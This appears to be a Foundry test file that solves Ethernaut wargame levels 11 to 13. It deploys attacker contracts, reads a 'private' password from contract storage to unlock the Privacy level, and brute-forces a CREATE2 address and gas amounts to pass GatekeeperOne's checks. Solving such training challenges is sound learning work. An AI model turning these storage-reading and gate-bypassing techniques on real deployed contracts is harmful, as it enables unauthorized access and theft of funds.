// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/ethernaut/Level11_Elevator.sol";
import "../src/ethernaut/Level12_Privacy.sol";
import "../src/ethernaut/Level13_GatekeeperOne.sol";

contract Ethernaut11_13Test is Test {
    Elevator public elevator;
    ElevatorAttacker public elevatorAttacker;
    Privacy public privacy;
    bytes32[3] public privacyData;
    GatekeeperOne public gatekeeper;

    address owner = makeAddr("owner");
    address attacker = makeAddr("attacker");

    function setUp() public {
        elevator = new Elevator();
        elevatorAttacker = new ElevatorAttacker(address(elevator));

        privacyData[0] = keccak256("secret0");
        privacyData[1] = keccak256("secret1");
        privacyData[2] = keccak256("secret2");
        privacy = new Privacy(privacyData);

        gatekeeper = new GatekeeperOne();
    }

    function test_Level11_Elevator() public {
        console.log("=== LEVEL 11: ELEVATOR ===");
        console.log("Before: top=%d, floor=%d", elevator.top(), elevator.floor());
        elevatorAttacker.attack(5);
        console.log("After: top=%d, floor=%d", elevator.top(), elevator.floor());
        assertTrue(elevator.top(), "Elevator should be at top");
        assertEq(elevator.floor(), 5, "Floor should be 5");
        console.log("[SOLVED] Level 11 complete!\n");
    }

    function test_Level12_Privacy() public {
        console.log("=== LEVEL 12: PRIVACY ===");
        console.log("Locked: %d", privacy.locked());

        // Fixed-size array: no length slot
        // Slot 0: locked, Slot 1: ID, Slot 2: data[0], Slot 3: data[1], Slot 4: data[2], Slot 5: key
        bytes32 password = vm.load(address(privacy), bytes32(uint256(5)));
        console.log("Password from slot 5: %s", vm.toString(password));
        console.log("Expected (key):       %s", vm.toString(privacyData[0]));
        assertEq(password, privacyData[0]);

        privacy.unlock(password);
        console.log("After unlock: %d", privacy.locked());
        assertEq(privacy.locked(), false);
        console.log("[SOLVED] Level 12 complete!\n");
    }

    function test_Level13_GatekeeperOne() public {
        console.log("=== LEVEL 13: GATEKEEPER ONE ===");

        // Step 1: Deploy attacker at address ending in 0000 via CREATE2
        GatekeeperOneAttacker attackerContract;
        bytes32 bytecodeHash = keccak256(abi.encodePacked(
            type(GatekeeperOneAttacker).creationCode,
            abi.encode(address(gatekeeper))
        ));

        for (uint256 i = 0; i < 200000; i++) {
            bytes32 salt = bytes32(uint256(i));
            address predicted = vm.computeCreate2Address(salt, bytecodeHash, address(this));
            if (uint16(uint160(predicted)) == 0x0000) {
                attackerContract = new GatekeeperOneAttacker{salt: salt}(address(gatekeeper));
                break;
            }
        }
        require(address(attackerContract) != address(0), "Could not find valid address");
        console.log("Attacker deployed at: %s", address(attackerContract));
        console.log("Last 2 bytes: %x", uint16(uint160(address(attackerContract))));

        // Step 2: Try calling enter() from attacker with different gas amounts
        // The gasleft() inside gateThree = gas_sent - CALL_overhead - modifier_costs
        // We brute-force by trying gas values in the range 10000-100000
        bool solved = false;
        for (uint256 g = 10000; g <= 100000; g++) {
            try attackerContract.tryEnter{gas: g}(uint16(0)) {
                solved = true;
                console.log("Solved with gas: %d", g);
                break;
            } catch {
                continue;
            }
        }

        require(solved, "Could not solve gateThree");
        assertEq(gatekeeper.getGatekeeper(), address(attackerContract));
        console.log("[SOLVED] Level 13 complete!\n");
    }

    function test_NormalOperations() public {
        assertEq(privacy.locked(), true);
        assertEq(privacy.ID(), 1);
    }
}

/**
 * @dev Attacker contract for Level 13 — deployed at address ending in 0000
 * Has a tryEnter() that the test calls with different gas amounts
 */
contract GatekeeperOneAttacker {
    GatekeeperOne public gatekeeper;

    constructor(address _gatekeeper) {
        gatekeeper = GatekeeperOne(_gatekeeper);
    }

    function tryEnter(uint16 _key) external {
        gatekeeper.enter(_key);
    }
}
